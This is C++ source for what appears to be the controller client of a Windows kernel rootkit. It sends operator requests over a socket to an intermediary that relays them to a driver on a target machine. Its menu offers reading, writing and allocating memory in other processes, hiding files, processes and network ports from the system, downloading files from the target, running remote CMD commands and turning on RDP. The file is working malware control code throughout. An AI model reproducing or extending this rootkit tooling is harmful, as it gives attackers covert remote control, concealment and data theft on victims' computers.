#include "communication.h"
#pragma warning(disable : 6064)
#pragma warning(disable : 4473)


// Global variables:
char ProcessorsNum = 8;  // Number of the processors on the machine, might get updated by system information request


void TripleManipulationInput(int* Object, int* RemoveIndex, const char* ManipulationType, NTSTATUS* RequestStatus) {
	/*
	Used to initialize parameters for hiding ports / processes(for now) that have adding, removing and listing attributes
	*/
	char InputStr[1024] = { 0 };
	char ReqType = '\0';
	if (Object != NULL && RemoveIndex != NULL && ManipulationType != NULL && RequestStatus != NULL) {
		printf("Write type of %s manipulation (r = remove hidden %s, l = list hidden %ses, else = add hidden %s):\n",
			ManipulationType, ManipulationType, ManipulationType, ManipulationType);
		scanf_s("%c", &ReqType);
		if (ReqType != 'l') {
			printf("Write identifier of %s to remove/add:\n", ManipulationType);
			scanf_s("%s", InputStr);
			*Object = GeneralUtils::GetNumFromString(InputStr);
			while (*Object == -1 || *Object == 0 || *Object >= 65535) {
				GeneralUtils::ResetString(InputStr);
				printf("Write identifier of %s to remove/add:\n", ManipulationType);
				scanf_s("%s", InputStr);
				*Object = GeneralUtils::GetNumFromString(InputStr);
			}
		}
		switch (ReqType) {
		case 'r':
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = UNHIDE_PROCESS;
			}
			else {
				*RequestStatus = UNHIDE_PORT;  // For now the only other one
			}
			printf("Unhide %s by index in list (I) or by number (else):\n", ManipulationType);
			scanf_s("%c", &ReqType);
			if (ReqType == 'I') {
				printf("Write index of %s to remove (make sure to use option l first):\n", ManipulationType);
				scanf_s("%s", InputStr);
				*RemoveIndex = GeneralUtils::GetNumFromString(InputStr);
				while (*RemoveIndex == -1) {
					GeneralUtils::ResetString(InputStr);
					printf("Write index of %s to remove (make sure to use option l first):\n", ManipulationType);
					scanf_s("%s", InputStr);
					*RemoveIndex = GeneralUtils::GetNumFromString(InputStr);
				}
			}
			break;

		case 'l':
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = SHOWHIDDEN_PROCESS;
			}
			else {
				*RequestStatus = SHOWHIDDEN_PORTS;  // For now the only other one
			}
			printf("No additional parameters for listing existing dynamically hidden %ses\n", ManipulationType);
			break;
		default:
			if (strcmp(ManipulationType, "process") == 0) {
				*RequestStatus = HIDE_PROCESS;
			}
			else {
				*RequestStatus = HIDE_PORT;  // For now the only other one
			}
			break;
		}
	}
}


void ValidFilePathInput(char* FilePathBuffer, char* RequestIdentifier) {
	/*
	Used before calling file hiding request to validate file path
	*/
	while (FilePathBuffer != NULL && RequestIdentifier != NULL) {
		printf("Write use of path (g = general name, block all occurences, else = specific path):\n");
		scanf_s("%c", RequestIdentifier);
		printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||):\n");
		scanf_s("%s", FilePathBuffer);
		if (strcmp(FilePathBuffer, "|||***|||") == 0) {
			GeneralUtils::ResetString(FilePathBuffer);
			continue;
		}
		while (!GeneralUtils::ValidateFileReqPath(FilePathBuffer, *RequestIdentifier)) {
			GeneralUtils::ResetString(FilePathBuffer);
			printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||) ->\n");
			scanf_s("%s", FilePathBuffer);
			if (strcmp(FilePathBuffer, "|||***|||") == 0) {
				GeneralUtils::ResetString(FilePathBuffer);
				break;
			}
		}
		if (strcmp(FilePathBuffer, "|||***|||") != 0) {
			break;  // A valid path was provided
		}
	}
}


int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
	PASS_DATA SocketResult = { 0 };
	ROOTKIT_OPERATION ClientOprStatus = RKOP_NOOPERATION;
	ROOTKIT_OPERATION MediumOprStatus = RKOP_NOOPERATION;
	ROOTKIT_UNEXERR UnexpectedErrCode = successful;
	NTSTATUS SpecialOprStatus = STATUS_UNSUCCESSFUL;  // Only used for hand-crafted status codes for files, processes and ports
	ROOTKIT_MEMORY SystemInfo = { 0 };  // Used for system information request

	char RequestIdentifier = '\0';
	char InputString[1024] = { 0 };
	BOOL CurrentRequestHandled = FALSE;
	BOOL OperationResult = FALSE;
	char MainDescString[1024] = { 0 };
	char SemiDescString[1024] = { 0 };
	PVOID OperationBuffer = NULL;

	ULONG64 DestinationAddress = 0;
	ULONG64 SourceAddress = 0;
	ULONG64 BaseAddress = 0;  // Stores the base address of a module / of allocation requests
	ULONG OperationSize = 0;

	int RemoveIndex = -1;
	int RemoveIdentifier = -1;
	WCHAR WideFilePath[1024] = { 0 };


	while (TRUE) {

		// Get type of request to perform:
		switch (GeneralUtils::ReturnInput("Choose NOW ROOTKIT : \n"
			"W. Write into process memory\n"
			"R. Read from process memory\n"
			"B. Get Module base address\n"
			"S. Get system information\n"
			"A. Allocate specific memory region in a specific process\n"
			"H. Dynamically hidden files/folders manipulation\n"
			"P. Dynamically hidden processes manipulation\n"
			"p. Dynamically hidden port manipulation\n"
			"G. Get file from target machine\n"
			"X. Execute CMD command on the target machine\n"
			"r. Initiate an RDP server on the target machine\n")) {
		case 'W': ClientOprStatus = RKOP_WRITE; break;

		case 'R': ClientOprStatus = RKOP_READ; break;

		case 'B': ClientOprStatus = RKOP_MDLBASE; break;

		case 'S': ClientOprStatus = RKOP_SYSINFO; break;

		case 'A': ClientOprStatus = RKOP_PRCMALLOC; break;

		case 'H': ClientOprStatus = RKOP_HIDEFILE; break;

		case 'P': ClientOprStatus = RKOP_HIDEPROC; break;

		case 'p': ClientOprStatus = RKOP_HIDEPORT; break;

		case 'G': ClientOprStatus = RKOP_GETFILE; break;

		case 'X': ClientOprStatus = RKOP_EXECOMMAND; break;

		case 'd': ClientOprStatus = RKOP_ACTIVATERDP; break;

		default:
			printf("Quit (press y to accept)?\n");
			scanf_s("%c", &RequestIdentifier);
			if (RequestIdentifier == 'y') {
				closesocket(Sender.AsoSock);
				return -1;
			}

			ClientOprStatus = RKOP_NOOPERATION;
			CurrentRequestHandled = FALSE;
			break;
		}


		if (ClientOprStatus == RKOP_NOOPERATION) {
			goto ErrorCheck;
		}

		// Exchange the type of request with medium to verify connection per-request:
		SocketResult = SendData(Sender.AsoSock, &ClientOprStatus, sizeof(ClientOprStatus), FALSE, 0);
		if (SocketResult.err || SocketResult.value != sizeof(ClientOprStatus)) {
			goto ErrorCheck;
		}
		SocketResult = RecvData(Sender.AsoSock, sizeof(MediumOprStatus), &MediumOprStatus, FALSE, 0);
		if (SocketResult.err || SocketResult.value != sizeof(MediumOprStatus)) {
			goto ErrorCheck;
		}
		if (MediumOprStatus == RKOP_TERMINATE) {
			printf("Medium requested termination..\n");
			SocketResult = SendData(Sender.AsoSock, &MediumOprStatus, sizeof(MediumOprStatus), FALSE, 0);
			closesocket(Sender.AsoSock);
			return -1;
		}
		if (MediumOprStatus != ClientOprStatus) {
			printf("Did not return correct operation (expected %lu but got %lu instead)\n", ClientOprStatus, MediumOprStatus);
			ClientOprStatus = RKOP_NOOPERATION;
		}

		CurrentRequestHandled = FALSE;
		printf("Write main string for the operation (process name, mymyymym to specify medium process, file path, command to execute..):\n");
		GeneralUtils::ResetString(InputString);
		scanf_s("%s", InputString);
		RtlCopyMemory(MainDescString, InputString, strlen(InputString) + 1);
		printf("Main string of operation - %s\n", MainDescString);

		switch (ClientOprStatus) {
		case RKOP_WRITE:

			// Write into process virtual memory, get name of source process:
			GeneralUtils::ResetString(InputString);
			printf("Write secondary process name for the operation (relevant process name, mymyymym for medium process or regular for regular buffer passing), no systemspace:\n");
			scanf_s("%s", InputString);
			RtlCopyMemory(SemiDescString, InputString, strlen(InputString) + 1);
			printf("Secondary request process name - %s\n", SemiDescString);


			// Set up the input buffer, operation size and destination address for all cases:
			if (strcmp(InputString, REGULAR_BUFFER_WRITE) == 0 && UnexpectedErrCode == successful) {
				printf("Write value to write into memory of target (string for now):\n");
				scanf_s("%s", InputString);
				OperationSize = (ULONG)strlen(InputString) + 1;
				OperationBuffer = (PVOID)InputString;  // Buffer will not be changed, but will be copied somewhere else
			}
			else {
				if (UnexpectedErrCode == successful) {
					printf("Write address to write from memory into target (ULONG64 value, no systemspace):\n");
					scanf_s("%llu", &SourceAddress);
					OperationBuffer = (PVOID)SourceAddress;
					printf("Write size of data to write from %s to %s (ULONG value):\n", (char*)SemiDescString, (char*)MainDescString);
					scanf_s("%lu", &OperationSize);
				}
			}
			if (UnexpectedErrCode == successful) {
				printf("Write address to write into in memory of target (ULONG64 value, no systemspace):\n");
				scanf_s("%llu", &DestinationAddress);
			}
			else {
				DestinationAddress = NULL;
			}
			

			// Write into process virtual memory (from user supplied buffer / another process):
			if (!DriverCalls::WriteToRootkKMD((PVOID)DestinationAddress, OperationBuffer, OperationSize, (char*)MainDescString, (char*)SemiDescString, Sender.AsoSock, UnexpectedErrCode, 0)) {
				printf("Write function did not succeed\n");
				break;
			}
			else {
				printf("Write function succeeded\n");
				break;
			}

		case RKOP_READ:

			// Read from process virtual memory, set up source address and output buffer:
			printf("Write amount of bytes to read:\n");
			scanf_s("%lu", &OperationSize);
			OperationBuffer = malloc(OperationSize);
			if (OperationBuffer == NULL) {
				printf("Cannot allocate memory for reading buffer\n");
				UnexpectedErrCode = memalloc;
			}

			if (UnexpectedErrCode == successful) {
				printf("Write the address to read from (ULONG64 value, no systemspace):\n");
				scanf_s("%llu", &SourceAddress);
			}
			else {
				SourceAddress = NULL;
			}


			// Read from process virtual memory:
			if (!DriverCalls::ReadFromRootkKMD((PVOID)SourceAddress, OperationBuffer, OperationSize, (char*)MainDescString, Sender.AsoSock, UnexpectedErrCode)) {
				printf("Read function did not succeed\n");
				free(OperationBuffer);
				break;
			}
			printf("Read function did succeed, printing values as string -> %s\n", (char*)OperationBuffer);
			free(OperationBuffer);
			break;

		case RKOP_MDLBASE:

			// Get the base address of a process module (executable) in memory:
			printf("No extra buffer parameters for getting the module base..\n");
			BaseAddress = (ULONG64)DriverCalls::GetModuleBaseRootkKMD((char*)MainDescString, Sender.AsoSock);
			if (BaseAddress == NULL) {
				printf("Module base operation failed\n");
				break;
			}
			printf("Module base operation succeeded -> %p\n", (PVOID)BaseAddress);
			break;

		case RKOP_SYSINFO:

			// Query information about the target system (with ZwQuerySystemInformation):
			GeneralUtils::ResetString(InputString);
			printf("Write system info request types string (only from allowed characters):\n"
				"r - Registry\nb - Basic\np - Performance\nt - TimeOfDay\nc - Processes (and threads)\n"
				"P - Processor Performance\ni - Interrupts (from all processors, array of 8)\n"
				"e - Exceptions (of all processors, array of 8)\nL - Lookaside\nI - Code Integrity\n");
			scanf_s("%s", InputString);
			
			if (!DriverCalls::GetSystemInfoRootkKMD(InputString, Sender.AsoSock, &SystemInfo, (char*)MainDescString, &ProcessorsNum)) {
				printf("Get system information did not work\n");
				break;
			}
			printf("Get system information succeeded\n");
			break;

		case RKOP_PRCMALLOC:

			// Allocate memory in a specific process:
			printf("Write amount of bytes to allocate:\n");
			scanf_s("%lu", &OperationSize);
			printf("Write the address to allocate in memory (ULONG64 value, no systemspace):\n");
			scanf_s("%llu", &BaseAddress);

			BaseAddress = (ULONG64)DriverCalls::SpecAllocRootkKMD((PVOID)BaseAddress, OperationSize, (char*)MainDescString, Sender.AsoSock, UnexpectedErrCode, 0);
			if (BaseAddress == NULL) {
				printf("Allocation function did not succeed\n");
				break;
			}
			printf("Allocation function succeeded (%p)\n", (PVOID)BaseAddress);
			break;

		case RKOP_HIDEFILE:

			// Request for hiding file/folder, get type of file manipulation:
			printf("Write type of manipulation (r = remove hidden file, l = list hidden files, else = add hidden file):\n");
			scanf_s("%c", &RequestIdentifier);
			switch (RequestIdentifier) {
			case 'r':
				SpecialOprStatus = UNHIDE_FILEFOLDER;
				GeneralUtils::ResetString(InputString);
				printf("Write index of file to remove (make sure to use option l first):\n");
				scanf_s("%s", InputString);
				RemoveIndex = GeneralUtils::GetNumFromString(InputString);
				while (RemoveIndex == -1) {
					GeneralUtils::ResetString(InputString);
					printf("Write index of file to remove (make sure to use option l first):\n");
					scanf_s("%s", InputString);
					RemoveIndex = GeneralUtils::GetNumFromString(InputString);
				}
				break;

			case 'l':
				SpecialOprStatus = SHOWHIDDEN_FILEFOLDER;
				printf("No additional parameters for listing existing dynamically hidden files\n");
				break;

			default:
				SpecialOprStatus = HIDE_FILEFOLDER;
				GeneralUtils::ResetString(InputString);
				ValidFilePathInput(InputString, &RequestIdentifier);
				GeneralUtils::WideResetString(WideFilePath);
				GeneralUtils::CharpToWcharp(InputString, WideFilePath);
				wprintf(L"Path to hiding file/folder - %s\n", WideFilePath);
				break;
			}

			OperationResult = DriverCalls::HideFileRootkKMD((char*)MainDescString, WideFilePath, RemoveIndex, Sender.AsoSock, SpecialOprStatus);
			if (OperationResult) {
				printf("Files/folders manipulation succeeded!\n");
			}
			else {
				printf("Files/folders manipulation did not succeed\n");
			}
			RemoveIndex = -1;
			OperationResult = FALSE;
			SpecialOprStatus = STATUS_UNSUCCESSFUL;
			break;

		case RKOP_HIDEPROC:

			// Request for hiding processes, get type of process manipulation:
			TripleManipulationInput(&RemoveIdentifier, &RemoveIndex, "process", &SpecialOprStatus);
			OperationResult = DriverCalls::HideProcessRootkKMD((char*)MainDescString, TRUE, RemoveIdentifier, RemoveIndex, Sender.AsoSock, SpecialOprStatus);
			if (OperationResult) {
				printf("Processes manipulation succeeded!\n");
			}
			else {
				printf("Processes manipulation did not succeed\n");
			}
			RemoveIndex = -1;
			OperationResult = FALSE;
			SpecialOprStatus = STATUS_UNSUCCESSFUL;
			break;

		case RKOP_HIDEPORT:

			// Request for hiding ports, get type of port manipulation:
			TripleManipulationInput(&RemoveIdentifier, &RemoveIndex, "port", &SpecialOprStatus);
			OperationResult = DriverCalls::HidePortConnectionRootkKMD((char*)MainDescString, RemoveIdentifier, RemoveIndex, Sender.AsoSock, SpecialOprStatus);
			if (OperationResult) {
				printf("Ports manipulation succeeded!\n");
			}
			else {
				printf("Ports manipulation did not succeed\n");
			}
			RemoveIndex = -1;
			OperationResult = FALSE;
			SpecialOprStatus = STATUS_UNSUCCESSFUL;
			break;

		case RKOP_GETFILE:

			// Get file from target machine:
			OperationResult = GeneralRequests::DownloadFileRequest((char*)MainDescString, Sender.AsoSock);
			if (!OperationResult) {
				printf("Failed operation - %d\n", GetLastError());
			}
			else {
				printf("Operation succeeded\n");
			}
			break;

		case RKOP_EXECOMMAND:

			// Execute cmd command:
			OperationResult = GeneralRequests::RemoteCommandRequest((char*)MainDescString, Sender.AsoSock);
			if (!OperationResult) {
				printf("Failed operation - %d\n", GetLastError());
			}
			else {
				printf("Operation succeeded\n");
			}
			break;

		case RKOP_ACTIVATERDP:

			// Activate RDP service:
			OperationResult = GeneralRequests::ActivateRDPRequest(Sender.AsoSock, (char*)MainDescString);
			if (!OperationResult) {
				printf("Failed operation - %d\n", GetLastError());
			}
			else {
				printf("Operation succeeded\n");
			}
			break;
		}
		ClientOprStatus = RKOP_NOOPERATION;
		MediumOprStatus = RKOP_NOOPERATION;
		UnexpectedErrCode = successful;
		continue;

	ErrorCheck:
		if (ClientOprStatus != RKOP_NOOPERATION && SocketResult.err) {
			printf("An error occurred\n");
			if (SocketResult.Term) {
				printf("Critical socket error occurred, quitting..\n");
				closesocket(Sender.AsoSock);
				return -1;
			}
		}
	}


	// Clean important variables and network stack from last request:
	printf("Finished handling current connection with medium\n");
	CleanNetStack(Sender.AsoSock);
	closesocket(Sender.AsoSock);
	return 0;
}